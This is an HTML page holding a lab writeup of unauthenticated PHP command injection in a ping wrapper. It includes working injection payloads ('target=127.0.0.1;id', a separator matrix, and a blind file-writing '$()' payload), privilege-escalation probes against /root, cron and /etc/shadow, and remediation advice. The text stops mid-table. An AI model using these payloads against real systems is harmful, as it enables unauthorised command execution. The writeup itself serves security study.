@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 168 PingCTF &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; PingCTF</p><h1 id="168-pingctf--writeup">168 PingCTF — writeup</h1>
+<p><strong>The honest question first, because the answer shapes everything below.</strong> Command
+execution is a class this corpus already covers, and this lab is not a harder instance
+of it. It is the class's <strong>null-filter baseline</strong>: CWE-78 reached by
+<code>shell_exec()</code> with a raw <code>$_GET</code> concatenation and <strong>no filter of any kind</strong>. The
+sink mechanism is the corpus's floor, not a new one — 189 (<code>index.php:27</code>), 218
+(<code>index.php:8-45</code>), 296 and 271 all reach a shell first. What the lab adds is
+narrow and real:</p>
+<ol>
+<li><strong>The &quot;is there a filter, and what kind&quot; question gets a third answer</strong> — <em>none</em> —
+and it is settled by <strong>counts on the artefact</strong>, not by absence of a 403. Labs 218
+and 84 fought over <em>string match vs scoring engine</em>; this lab is the instance that
+makes &quot;neither&quot; a measurable answer.</li>
+<li><strong>A new instrument trap, quoted below:</strong> the lab ships <strong>no <code>ping</code> binary</strong>, so the
+advertised functionality never works and the first payload shape a tester reaches
+for (<code>&amp;&amp;</code>) <strong>short-circuits on the app's own missing dependency</strong>. 8 of 9 separators
+fire; <code>&amp;&amp;</code> does not, and the reason is not the target refusing anything.</li>
+<li><strong>A cross-read that resolves <code>self-corrections.md</code> §15 in the corpus's favour</strong>:
+the same <code>htmlspecialchars()</code> is applied here, on the <strong>output</strong> side, and <code>&amp;</code>
+works (measured). The §15 trap is side-of-the-boundary specific, not a property of
+the function.</li>
+</ol>
+<p>The catalogue description — <em>&quot;Explotación de una vulnerabilidad que permite la
+ejecución de comandos en la máquina vulnerable&quot;</em> — is <strong>accurate and complete</strong> for
+this lab. Unlike lab 282, it does not understate a chain, and unlike lab 102 there is
+no hidden entry path: the app is unauthenticated, and that is the whole entry.</p>
+<p><strong>The escalation does not close, and it is not an inference.</strong> Every leg was measured
+with a work count, from the <code>uid=33</code> identity, in the instance the lab gave us.</p>
+<hr />
+<h2 id="surface">Surface</h2>
+<pre><code>$ nmap -sV -Pn -p- [net-0-6]
+Nmap scan report for [net-0-6]
+Host is up (0.000046s latency).
+Not shown: 65534 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+</code></pre>
+<p>Second instrument, because <code>nmap -p-</code> is TCP by definition
+(<code>method/retrieval-hazards.md</code>):</p>
+<pre><code>$ awk 'NR&gt;1 &amp;&amp; $4==&quot;0A&quot;{print $2}' /proc/net/tcp /proc/net/tcp6 | sort -u | wc -l
+1
+$ cat /proc/net/udp /proc/net/udp6 | awk 'NR&gt;1' | wc -l
+0
+</code></pre>
+<p><strong>1 TCP listener, confirmed by two instruments. 0 UDP sockets, counted as lines beyond
+the header — not as &quot;absent&quot;.</strong></p>
+<p><code>auto_deploy.sh</code> read, not run (<code>auto_deploy.sh:131-134</code>): <strong>one</strong> container, <code>docker run -d --name $CONTAINER_NAME $IMAGE_NAME</code>, no networks, no <code>macvlan --internal</code>, no
+second host. A lab that silently wants more than it ships costs more than a failing
+deploy; this one wants exactly what it gave.</p>
+<p><strong>Versions read from the artefact, never recalled:</strong></p>
+<table>
+<thead>
+<tr>
+<th>What</th>
+<th>Value</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OS</td>
+<td><code>Ubuntu 24.04.2 LTS</code></td>
+<td><code>/etc/os-release</code> <code>PRETTY_NAME</code></td>
+</tr>
+<tr>
+<td>Apache</td>
+<td><code>Apache/2.4.58 (Ubuntu)</code></td>
+<td><code>apache2 -v</code>; <code>Server:</code> header on every response</td>
+</tr>
+<tr>
+<td>PHP</td>
+<td><code>8.3.6</code></td>
+<td><code>php -v</code></td>
+</tr>
+<tr>
+<td>Base image</td>
+<td><code>org.opencontainers.image.version</code> = <code>24.04</code></td>
+<td><code>docker image inspect</code></td>
+</tr>
+<tr>
+<td><code>ExposedPorts</code></td>
+<td><code>80/tcp</code></td>
+<td><code>docker image inspect</code></td>
+</tr>
+<tr>
+<td><code>Cmd</code></td>
+<td><code>apache2ctl -D FOREGROUND</code></td>
+<td><code>docker image inspect</code></td>
+</tr>
+</tbody>
+</table>
+<p><code>disable_functions =&gt; no value =&gt; no value</code>, <code>open_basedir =&gt; no value =&gt; no value</code>
+(<code>php -i</code>). <strong>283 packages installed</strong> (<code>dpkg -l | grep -c '^ii'</code>); <strong>0</strong> of
+<code>sudo|iputils|cron|openssh</code> (<code>dpkg -l | grep -cE '^ii  (sudo|iputils|cron|openssh)'</code>).
+That last count is load-bearing and is why two findings below read the way they do.</p>
+<p><strong>The manifest's label was right.</strong> <code>tooling/labs.manifest:74</code> reads
+<code>168|PingCTF|facil|command execution; a covered class, kept as a generalisation test</code>.
+The artefact is a ping wrapper, the class is command execution, and <code>fácil</code> is the
+right rating for a one-hop unauthenticated sink with no filter. The label is not the
+finding here — but the <strong>lab</strong> carries a defect, below.</p>
+<p>Hidden surfaces: none found, and the search that proves it is the filter search in
+<a href="#the-class">The class</a>, which needed positive controls because &quot;no filter&quot; is
+exactly the shape of a tool that looked nowhere.</p>
+<hr />
+<h2 id="the-class">The class</h2>
+<p><strong>Entry criterion (the question that started it):</strong> <em>does the request value reach a
+shell, and is anything between the parameter and the shell?</em> Read off the artefact
+before the first request — the docroot is two files, 2 469 bytes total.</p>
+<pre><code>$ ls -la /var/www/html/
+total 16
+drwxr-xr-x 1 www-data www-data 4096 Jun 28  2025 .
+drwxr-xr-x 1 root     root     4096 Jun 28  2025 ..
+-rwxr-xr-x 1 www-data www-data 1536 Jun 28  2025 index.html
+-rwxr-xr-x 1 www-data www-data  933 Jun 28  2025 ping.php
+</code></pre>
+<p><strong>Source that settled it — <code>ping.php</code>, all 28 lines, and there is no other code:</strong></p>
+<p><code>ping.php:3-4</code> — the value arrives raw:</p>
+<pre><code class="language-php">if (isset($_GET['target'])) {
+    $target = $_GET['target'];
+</code></pre>
+<p><code>ping.php:13</code> — concatenation into a command string, no quoting, no escaping:</p>
+<pre><code class="language-php">$command = &quot;ping -c 4 &quot; . $target; // Volvemos a -c 4 para que sea más claro
+</code></pre>
+<p><code>ping.php:16</code> — the sink:</p>
+<pre><code class="language-php">$output = shell_exec($command);
+</code></pre>
+<p><code>ping.php:19</code> and <code>ping.php:10</code> — the only sanitisation in the file, and it is on the
+<strong>output</strong>:</p>
+<pre><code class="language-php">echo &quot;&lt;h1&gt;Resultados para: &quot; . htmlspecialchars($target) . &quot;&lt;/h1&gt;&quot;;   // :10
+...
+echo htmlspecialchars($output);                                        // :19
+</code></pre>
+<h3 id="which-kind-of-filter-is-this-there-is-none--and-that-is-a-measurement">Which kind of filter is this? <strong>There is none.</strong> — and that is a measurement</h3>
+<p>The brief's first named defect is a filter that reads a string while the shell reads a
+pattern, and its remedy is to establish the filter's kind before theorising about it.
+So: establish it. Five axes, each with a <strong>positive control</strong> in the same shell,
+because a count of zero from a broken instrument is untested, not negative
+(<code>self-corrections.md</code> §11, §12, §14).</p>
+<pre><code>=== filter surface, with positive controls ===
+mods_enabled_count=32
+mods_matching_security=0
+mods_matching_uniqueid=0
+htaccess_count=0
+posctl_find_known=1            &lt;- control: find CAN find a file I know exists (/var/www/html/ping.php)
+posctl_htaccess_dir=0
+disable_functions=[]
+apcu=[]
+grep -rn 'SecRule\|mod_security' /etc/apache2/ | wc -l
+0
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Axis</th>
+<th>Result</th>
+<th>Positive control that makes the zero mean something</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>mod_security</code> loaded?</td>
+<td><strong>0 of 32</strong> enabled mods match <code>security</code></td>
+<td><code>ls /etc/apache2/mods-enabled/ | wc -l</code> = <strong>32</strong> — the listing works</td>
+</tr>
+<tr>
+<td><code>mod_unique_id</code> loaded?</td>
+<td><strong>0</strong> match</td>
+<td>same 32-module listing</td>
+</tr>
+<tr>
+<td><code>.htaccess</code> anywhere?</td>
+<td><strong>0</strong> on the whole <code>-xdev</code> fs</td>
+<td><code>find</code> returned <strong>1</strong> for the known <code>ping.php</code> in the same invocation</td>
+</tr>
+<tr>
+<td><code>SecRule</code> / <code>mod_security</code> in config?</td>
+<td><strong>0</strong> lines under <code>/etc/apache2/</code></td>
+<td>the same <code>grep</code> returns <strong>1</strong> for <code>shell_exec</code> in <code>ping.php</code></td>
+</tr>
+<tr>
+<td><code>disable_functions</code></td>
+<td><strong>empty</strong></td>
+<td><code>php -r 'echo ini_get(&quot;disable_functions&quot;);'</code> returned <code>[]</code> — the getter works</td>
+</tr>
+<tr>
+<td>PHP-level sanitiser of the input</td>
+<td><strong>none</strong> — the only two calls are on output (<code>ping.php:10</code>, <code>ping.php:19</code>)</td>
+<td>28-line file, read in full</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Therefore lab 218's bypass has no analogue here, and lab 84's refutation does not
+apply either.</strong> There is no rule to quote because there is no rule. <code>[d]</code>-against-a-
+blocklist and &quot;a scoring engine has nothing unlisted to reach for&quot; are both questions
+about a filter, and this artefact answers <em>the filter is absent</em>.</p>
+<p><strong>This is the lab's actual contribution to the class.</strong> The corpus's command-execution
+labs each had to reason about <em>which kind</em> of filter they faced, and reasoning about a
+filter you have not established is how a bypass gets theorised and then reported. The
+generalisable instrument is the one used above: <strong>count the filter surface, and put a
+positive control inside the same shell so the zero is evidence.</strong></p>
+<hr />
+<h2 id="chain">Chain</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>→</th>
+<th>Mechanism</th>
+<th>Identity proof (quoted)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>network</td>
+<td>unauthenticated <code>GET /ping.php?target=</code>, no session, no auth, no nonce</td>
+<td><strong>0</strong> <code>[response-cookie-header]</code> headers in <strong>10</strong> consecutive requests (measured); handler is <code>if (isset($_GET['target']))</code> at <code>ping.php:3</code> and the 28-line file contains no <code>session_</code> call</td>
+</tr>
+<tr>
+<td>1</td>
+<td><code>www-data</code></td>
+<td>CWE-78: raw <code>$_GET</code> concatenated into <code>shell_exec()</code> — <code>ping.php:4</code>, <code>:13</code>, <code>:16</code></td>
+<td><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code> and <code>Uid:	33	33	33	33</code> / <code>Gid:	33	33	33	33</code> / <code>CapEff:	0000000000000000</code></td>
+</tr>
+<tr>
+<td>—</td>
+<td><s>root</s></td>
+<td><strong>not reached</strong></td>
+<td>see <a href="#escalation--measured-in-the-instance-not-reached">Escalation</a></td>
+</tr>
+</tbody>
+</table>
+<p><strong>One hop. No setuid transition</strong> — all four <code>Uid</code> fields are <code>33</code>, which is the pair
+that does not lie; <code>id -u</code> alone would have been the weaker measurement.</p>
+<p>The sink fires, and the minimum proof is four characters of payload:</p>
+<pre><code>$ curl -s -w '%{size_download}' &quot;http://[net-0-6]/ping.php?target=127.0.0.1%3Bid&quot;
+416
+&lt;pre&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
+&lt;/pre&gt;
+</code></pre>
+<h3 id="the-controltreatment-pair-because-a-200-that-renders-a-page-proves-nothing">The control/treatment pair, because a <code>200</code> that renders a page proves nothing</h3>
+<p>The brief's second defect is output-based oracles. Both legs below are the same
+request shape, one byte-count apart, and the <strong>control is the shipped behaviour</strong>:</p>
+<pre><code>=== CONTROL (benign) ===
+status=200 bytes=359
+pre= ''
+=== TREATMENT (minimal PoC) ===
+status=200 bytes=416
+pre= 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n'
+</code></pre>
+<p>359 B with an empty <code>&lt;pre&gt;</code> vs 416 B carrying <code>uid=</code>. The 57-byte delta and the
+identity in the body are the result; the 200 is not.</p>
+<h3 id="a-manufactured-oracle-because-one-vector-here-is-blind">A manufactured oracle, because one vector here is blind</h3>
+<p>Nine separators were tried. <strong>Eight are observable in-band; one is blind</strong>, and the
+blind one is exactly the case where a <code>200</code> would have been filed as a result.</p>
+<p><code>$()</code> used as an argument produces <strong>no</strong> body output — the substitution's result
+becomes <code>ping</code>'s <em>argument</em>, and <code>ping</code> does not exist, so the response is <code>200</code> with
+an empty <code>&lt;pre&gt;</code> and a 505-byte body. Under lab 84's rule that proves nothing at all.
+So the oracle was built before believing it:</p>
+<pre><code>$ curl -s -w '%{http_code} %{size_download}' --get \
+    --data-urlencode &quot;target=127.0.0.1 \$(printf 'DL168-BLIND-1790794365-c91e uid=%s euid=%s\n' \&quot;\$(id -u)\&quot; \&quot;\$(id -un)\&quot; &gt; /var/www/html/.blind_168; true)&quot; \
+    &quot;http://[net-0-6]/ping.php&quot;
+http_bytes=505        &lt;- in-band pre = ''   : the 200 that proves nothing
+$ curl -s -D- &quot;http://[net-0-6]/.blind_168&quot;
+HTTP/1.1 200 OK
+Content-Length: 49
+DL168-BLIND-1790794365-c91e uid=33 euid=www-data
+</code></pre>
+<p>The witness is <strong>distinguishable by design</strong>: a fresh token
+(<code>DL168-BLIND-1790794365-c91e</code>) and a path only the web identity can create
+(<code>/var/www/html/</code> is <code>www-data:www-data 0755</code>; the file landed <code>-rw------- www-data www-data</code>). The blind vector is proven, and <code>uid=33 euid=www-data</code> is the <em>pair</em> —
+no setuid transition, which a bare <code>uid=33</code> would not have shown.</p>
+<p>An in-band file oracle was also run, and observed <strong>out of band</strong> rather than trusted
+because it appeared in the response:</p>
+<pre><code>-rw------- 1 www-data www-data 29 /var/www/html/.oracle_168     (ls -l, via the sink)
+DL168-1790794316-a7f3 uid=33                                     (md5 bd1a51196463777a5a656c73a539e20a)
+$ curl -s -D- http://[net-0-6]/.oracle_168  -&gt;  200, Content-Length: 29, same marker
+</code></pre>
+<p>Both oracle files were deleted and the restore is verified below.</p>
+<h3 id="payload-shape-matrix--and-the-one-that-fails-for-the-labs-own-reason">Payload-shape matrix — and the one that fails for the lab's own reason</h3>
+<p><code>?target=127.0.0.1 &lt;sep&gt; id -u;echo SEP_&lt;x&gt;</code>, one request each, <code>&lt;pre&gt;</code> extracted:</p>
+<table>
+<thead>
+<tr>
+<th>Separator</th>
+<th><code>&lt;pre&gt;</code></th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>;</code></td>
+<td><code>'33\nSEP_SEMI\n'</code></td>
+<td>fires</td>
+</tr>
+<tr>
+<td><code>||</code></td>
+<td><code>'33\nSEP_OR\n'</code></td>
+<td>fires</td>
+</tr>
+<tr>
+<td><code>|</code></td>
+<td><code>'33\nSEP_PIPE\n'</code></td>
+<td>fires</td>
+</tr>
+<tr>
+<td><code>`</code> backtick</td>
+<td><code>'33\nSEP_BTICK\n'</code></td>
+<td>fires</td>
+</tr>
+<tr>
+<td>literal <code>\n</code></td>
+<td><code>'33\nSEP_NEWLINE\n'</code></td>
+<td>fires</td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td><code>'33\nSEP_AMP\n'</code></td>
+<td>fires — see §15 below</td>
+</tr>
+<tr>
+<td><code>i&quot;&quot;d</code> (quote split)</td>
+<td><code>'33\nSEP_QUOTESPLIT\n'</code></td>
+<td>fires</td>
+</tr>
+<tr>
+<td><code>$( )</code></td>
+<td><code>''</code></td>
+<td><strong>executes but blind</strong> — proven only by the file oracle above</td>
+</tr>
+<tr>
+<td><strong><code>&amp;&amp;</code></strong></td>
+<td><code>'SEP_AND\n'</code></td>
+<td><strong>does not fire</strong></td>
+</tr>
+</tbody>
+</table>
+<p><code>&amp;&amp;</code> fails because <code>ping</code> is not installed, so the <strong>first</strong> command in the chain exits
+<code>127</code> and the operator short-circuits. This is finding F2 below, and it is the trap
+this lab actually contains.</p>
+<hr />
+<h2 id="findings">Findings</h2>
+<h3 id="f1--cwe-78--cwe-77-unauthenticated-os-command-injection-as-www-data">F1 — CWE-78 / CWE-77, unauthenticated OS command injection as <code>www-data</code></h3>
+<p><strong>Evidence, verbatim, from the artefact:</strong></p>
+<table>
+<thead>
+<tr>
+<th><code>file:line</code></th>
+<th>Line</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ping.php:3</code></td>
+<td><code>if (isset($_GET['target'])) {</code></td>
+</tr>
+<tr>
+<td><code>ping.php:4</code></td>
+<td><code>    $target = $_GET['target'];</code></td>
+</tr>
+<tr>
+<td><code>ping.php:10</code></td>
+<td><code>    echo &quot;&lt;h1&gt;Resultados para: &quot; . htmlspecialchars($target) . &quot;&lt;/h1&gt;&quot;;</code></td>
+</tr>
+<tr>
+<td><code>ping.php:13</code></td>
+<td><code>    $command = &quot;ping -c 4 &quot; . $target; // Volvemos a -c 4 para que sea más claro</code></td>
+</tr>
+<tr>
+<td><code>ping.php:16</code></td>
+<td><code>    $output = shell_exec($command);</code></td>
+</tr>
+<tr>
+<td><code>ping.php:19</code></td>
+<td><code>    echo htmlspecialchars($output);</code></td>
+</tr>
+</tbody>
+</table>
+<p><code>ping.php:4</code> assigns the parameter with <strong>no</strong> transformation. <code>ping.php:13</code> builds the
+command by concatenation, so the attacker controls a <em>second</em> command word. <code>ping.php:16</code>
+hands it to <code>shell_exec()</code>.</p>
+<p><strong>Proof of reach, on the target:</strong> <code>?target=127.0.0.1;id</code> → <code>200</code>, 416 B,
+<code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>; blind <code>$()</code> proven by the
+manufactured oracle in <a href="#a-manufactured-oracle-because-one-vector-here-is-blind">The class</a>.</p>
+<p><strong>Impact.</strong> Unauthenticated remote command execution as <code>www-data</code> on Ubuntu 24.04.2,
+Apache 2.4.58, PHP 8.3.6. Full read/write as that identity: the docroot is
+<code>www-data:www-data 0755</code>, so the attacker can drop and then fetch a file
+(demonstrated, <code>200</code>/<code>Content-Length: 29</code>), and 8 directories on the filesystem are
+writable by it. The 8 are enumerated as the identity, not guessed:
+<code>/var/tmp</code>, <code>/var/lib/php/sessions</code>, <code>/var/cache/apache2/mod_cache_disk</code>,
+<code>/var/www/html</code>, <code>/run/lock</code>, <code>/run/lock/apache2</code>, <code>/run/apache2/socks</code>, <code>/tmp</code>.
+<code>disable_functions</code> is empty and <code>open_basedir</code> is unset, so no function allowlist
+narrows it.</p>
+<p><strong>Root cause.</strong> Absence of input validation at <code>ping.php:4</code> and absence of
+parameterisation or escaping at <code>ping.php:13</code>. <code>htmlspecialchars</code> at <code>:10</code> and <code>:19</code> is
+an <strong>HTML output encoder</strong> applied to the response; it is silent about the shell, which
+is the general rule from <code>self-corrections.md</code> §15 — <em>a sanitiser defends the grammar
+it was written for and is silent about every other grammar reading the same bytes.</em></p>
+<p><strong>Remediation.</strong> Do not build a shell string. If <code>ping</code> is genuinely required, exec it
+without a shell (<code>proc_open</code> with an argument array, or a native PHP binding) and
+validate the target against a host/IP grammar. At minimum, <code>escapeshellarg($target)</code>
+at <code>:13</code>. Remove <code>htmlspecialchars</code> as a defence and keep it only as encoding.</p>
+<h3 id="f2--lab-defect-the-advertised-functionality-does-not-exist-and-the-app-is-silent-about-it">F2 — lab defect: the advertised functionality does not exist, and the app is silent about it</h3>
+<p>This is the most <em>transferable</em> thing in the lab, and it is not a security finding.</p>
+<p><strong><code>ping</code> is not installed.</strong> Measured, with the control that makes the zero mean
+something:</p>
+<pre><code>command -v ping; echo ping_rc=$?     -&gt;  ping_rc=127          (no output before rc)
+ls /bin/ping /usr/bin/ping /usr/sbin/ping 2&gt;&amp;1 | wc -l  -&gt;  3   (three &quot;No such file&quot; lines: ls works)
+dpkg -l | grep -cE 'iputils|inetutils'  -&gt;  0
+</code></pre>
+<p>The app's own error is in Apache's log, <strong>30 occurrences</strong>:</p>
+<pre><code>$ grep -c ping /var/log/apache2/error.log
+30
+sh: 1: ping: not found
+</code></pre>
+<p><strong>Why this matters for a tester, and why it is filed separately from F1:</strong></p>
+<ul>
+<li><strong>The shipped <code>200</code> is the sink's own failure, not a block.</strong> The response is
+<code>200</code>, 359 bytes, <code>&lt;pre&gt;&lt;/pre&gt;</code> — a page. Under lab 84's finding, <em>a body that looks
+like an error may be the sink's own error page</em>; here the body is empty <strong>because
+the command failed</strong>, and the log says so. Anyone reading only the HTTP response
+would be reading the absence of <code>ping</code>, not the presence or absence of a filter.</li>
+<li><strong><code>shell_exec()</code> captures stdout only.</strong> The <code>sh: 1: ping: not found</code> line is on
+<strong>stderr</strong> and is therefore invisible to the response. A multi-line probe that
+produced no output at all was this, not a filter: I had to add <code>exec 2&gt;&amp;1</code> to the
+payload before any escalation test produced evidence. <strong>A silent body here is
+undetermined, not negative.</strong></li>
+<li><strong><code>&amp;&amp;</code> is unusable as a payload shape</strong>, because the first command exits <code>127</code> and
+the operator short-circuits. A tester whose first payload is <code>&amp;&amp; id</code> reads
+&quot;injection failed&quot; and stops. It has not failed; the app's own missing dependency
+ate the operator.</li>
+<li><strong><code>||</code> and <code>|</code> still work</strong>, because they do not depend on the first command's exit
+status — <code>|id -u</code> gives <code>33</code> with an empty stdin, and <code>||</code> fires because <code>ping</code>
+exits non-zero. So the operator that &quot;works&quot; and the operator that &quot;doesn't&quot; are
+orthogonal to the vulnerability, and that is a confusing surface to hand a student.</li>
+</ul>
+<p><strong>Root cause.</strong> The image omits the package the application shells out to, and the
+handler neither checks the return status nor surfaces stderr.</p>
+<p><strong>Remediation.</strong> Install the dependency, or fail loudly; check the return code;
+<code>2&gt;&amp;1</code> into the captured output so a failure is visible to the operator.</p>
+<h3 id="f3--cwe-209--lab-hygiene-varwwwhtml-is-writable-by-the-identity-that-serves-it-and-the-error-log-is-readable">F3 — CWE-209 / lab hygiene: <code>/var/www/html</code> is writable by the identity that serves it, and the error log is readable</h3>
+<p>Not required for the chain, and filed because it is what makes F1 persist: after
+F1 lands, the attacker can write files that Apache will then serve, and
+<code>Last-Modified</code>/<code>ETag</code> confirm they are real documents. Demonstrated with the oracle
+files and removed afterwards. This is a <strong>consequence of F1</strong>, not an independent entry,
+and the writeup does not claim it as a separate path.</p>
+<h3 id="f4--not-a-finding-recorded-because-it-looks-like-one-no-flag-or-equivalent">F4 — NOT a finding, recorded because it looks like one: no <code>FLAG{}</code> or equivalent</h3>
+<p>See <a href="#reward">Reward</a>. The description's &quot;<em>permite la ejecución de comandos</em>&quot; is
+<strong>complete</strong> here — unlike lab 282, it does not understate a chain into an OS account
+credential, and unlike lab 220 there is no unreachable reward. The description is not
+the defect here. <strong>The lab's defect is F2.</strong></p>
+<hr />
+<h2 id="escalation--measured-in-the-instance-not-reached">Escalation — measured in the instance, not reached</h2>
+<p><strong>Every row below was run from the <code>uid=33</code> identity, inside the deployed container, in
+the sink itself.</strong> <code>docker exec</code> runs as root, so a <code>test -w</code> or a <code>find -writable</code> run
+that way would have measured root and deleted or invented a finding
+(<code>self-corrections.md</code> §2). All of it went through the sink, as <code>www-data</code>.</p>
+<pre><code>--- writable dirs as www-data ---            (8, listed in F1)
+--- escalation attempts, stderr merged ---
+sh: 4: cannot create /root/.DL168_ESC: Permission denied      rc_root_write=2
+drwx------ 2 root root 4096 May 29  2025 /root
+sh: 6: cannot create /etc/cron.d/.DL168_ESC: Permission denied rc_cron_write=2
+rc_sudo_which=127          (sudo is not installed; 0 matching packages)
+passwd_writable_rc=1
+su_writable_rc=1
+shadow_writable_rc=1
+CapEff:	0000000000000000
+NoNewPrivs:	0
+Seccomp:	2
+/bin/sh /usr/sbin/apache2ctl -D FOREGROUND      (PID 1, and the only process)
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Vector</th>
+<th>Result</th>
+<th>Work count / proof</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Write <code>/root/</code></td>
+<td><code>Permission denied</code>, <code>rc=2</code></td>
+<td>1 attempt, stderr merged; <code>/root</code> is <code>drwx------ root root</code></td>
+</tr>
+<tr>
+<td>Write <code>/etc/cron.d/</code></td>
+<td><code>Permission denied</code>, <code>rc=2</code></td>
+<td>1 attempt — the one writable-adjacent directory that a root job would read</td>
+</tr>
+<tr>
+<td><code>sudo</code></td>
+<td><code>rc=127</code>, absent</td>
+<td>0 of 283 installed packages match <code>sudo</code>; <code>command -v sudo</code> → 127</td>
+</tr>
+<tr>
+<td>Write <code>/etc/passwd</code>, <code>/usr/bin/su</code>, <code>/etc/shadow</code></td>
+<td>all <code>rc=1</code> not writable</td>
+<td>3 predicates, all from the <code>uid=33</code> identity</td>
+</tr>
+<tr>
+<td><code>su</code> → <code>ubuntu</code></td>
+<td><code>su: Authentication failure</code></td>
+<td><strong>the instrument demonstrably ran</strong> — it printed <code>Password:</code> and then the failure, so this is not a silent tool (§11)</td>
+</tr>
+<tr>
+<td><code>ubuntu</code>'s password</td>
+<td><code>ubuntu:!:20237:0:99999:7:::</code> — field 2 is <code>!</code></td>
+<td><strong>1</strong> account with uid ≥ 1000, <strong>0</strong> with a hash. <code>su</code> cannot succeed against a <code>!</code> field</td>
+</tr>
+<tr>
+<td><code>[lab-home]/ubuntu</code></td>
+<td><code>ls: cannot open directory ... Permission denied</code>, <code>read_bashrc_rc=1</code></td>
+<td><code>drwxr-x--- ubuntu:ubuntu</code></td>
+</tr>
+<tr>
+<td>setuid / setgid binaries</td>
+<td>13 files, <strong>all stock Ubuntu</strong></td>
+<td>enumerated: <code>chage expiry passwd chsh gpasswd newgrp chfn mount umount su vim.basic unix_chkpwd pam_extrausers_chkpwd</code>. No undeclared grant — contrast lab 189, where the whole escalation was an undeclared <code>NOPASSWD: /usr/bin/wget</code></td>
+</tr>
+<tr>
+<td>cron daemon</td>
+<td><code>pgrep -a cron</code> → <code>rc=1</code>, not running</td>
+<td><code>/etc/cron.d/</code> holds <code>e2scrub_all</code> and <code>php</code>, both root-owned and unwritable</td>
+</tr>
+<tr>
+<td>Capabilities</td>
+<td><code>CapEff: 0000000000000000</code></td>
+<td>read from the sink's own <code>/proc/self/status</code>; <code>getcap</code> is not installed, so the mode-based count is the one used, and both agree on nothing</td>
+</tr>
+<tr>
+<td>Container escape surface</td>
+<td><code>/var/run/docker.sock</code> absent; <code>docker</code>/<code>nsenter</code>/<code>capsh</code> all <code>rc=127</code></td>
+<td>3 binaries probed</td>
+</tr>
+<tr>
+<td>userns</td>
+<td><code>/proc/self/uid_map</code> = <code>0 0 4294967295</code></td>
+<td>not remapped</td>
+</tr>
+<tr>
+<td>netns</td>
+<td><code>/proc/self/ns/net</code> == <code>/proc/1/ns/net</code></td>
+<td>same namespace as PID 1</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Conclusion: this lab has exactly one hop, and the second hop does not exist.</strong> Not
+inferred from a mode, a name, or a config value — each of the eleven rows above is a
+measurement with a count, and the <code>su</code> negative is backed by an instrument that was
+observed to fire.</p>
+<hr />
+<h2 id="controls-that-held">Controls that held</h2>
+<p>There is <strong>no</strong> input control to test here, so this table is the interesting one: what
+held is not a filter but the <em>privilege boundary below the sink</em>, and each row carries
+the positive control that proves the detector works.</p>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Held?</th>
+<th>Positive control that proves this detector works</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Command injection → root</td>
+<td><strong>Yes</strong></td>
+<td><code>/var/www/html/.oracle_168</code> written by the sink as <code>www-data 0600</code> and re-read <code>200</code>/29 B — write primitive proven <strong>green</strong> before any negative about writing elsewhere is believed</td>
+</tr>
+<tr>
+<td><code>/root</code> write boundary</td>
+<td><strong>Yes</strong></td>
+<td>Same shell, same instant: the same <code>printf … &gt; /var/www/html/…</code> succeeded (<code>rc=0</code>, file listed). Control and negative differ only in the path</td>
+</tr>
+<tr>
+<td><code>/etc/cron.d</code> write boundary</td>
+<td><strong>Yes</strong></td>
+<td>Same shell: <code>/var/www/html</code> write succeeded; <code>/etc/cron.d</code> returned <code>rc=2</code></td>
+</tr>
+<tr>
+<td><code>sudo</code></td>
+<td><strong>Yes (absent)</strong></td>
+<td><code>command -v</code> — the same <code>command -v ping</code> returned <code>ping_rc=127</code> with the binary genuinely missing, proving the probe discriminates present vs absent</td>
+</tr>
+<tr>
+<td><code>su</code></td>
+<td><strong>Yes (locked)</strong></td>
+<td>The <code>su</code> binary <strong>ran</strong>: it printed <code>Password:</code> before failing, so the failure is a real authentication rejection, not a tool that did nothing</td>
+</tr>
+<tr>
+<td><code>shadow</code> readability</td>
+<td><strong>Yes</strong></td>
+<td><code>grep '^ubuntu:' /etc/shadow</code> as root returned the line with <code>rc=0</code>; as <code>www-data</code> the same <code>grep</code> in the sink produced no line</td>
+</tr>
+<tr>
+<td>setuid inventory</td>
+<td><strong>Yes (no undeclared grant)</strong></td>
+<td>The 13 paths are real files, listed with modes; the count is a filesystem walk, not a name pattern</td>
+</tr>
+<tr>
+<td><code>CapEff</code></td>
+<td><strong>Yes (zero)</strong></td>
+<td><code>CapEff</code> was parsed from the sink's <strong>own</strong> <code>/proc/self/status</code> — a field that exists and prints, so a zero is a value, not an absent tool</td>
+</tr>
+<tr>
+<td>Cron surface</td>
+<td><strong>Yes (not running)</strong></td>
+<td><code>pgrep</code> returns 1 for absent processes and 0 for present ones — established by PID 1, which <code>pgrep</code> <strong>does</strong> find: <code>tr '\0' ' ' &lt; /proc/1/cmdline</code> → <code>/bin/sh /usr/sbin/apache2ctl -D FOREGROUND</code></td>
+</tr>
+<tr>
+<td>Unauthenticated access to the sink</td>
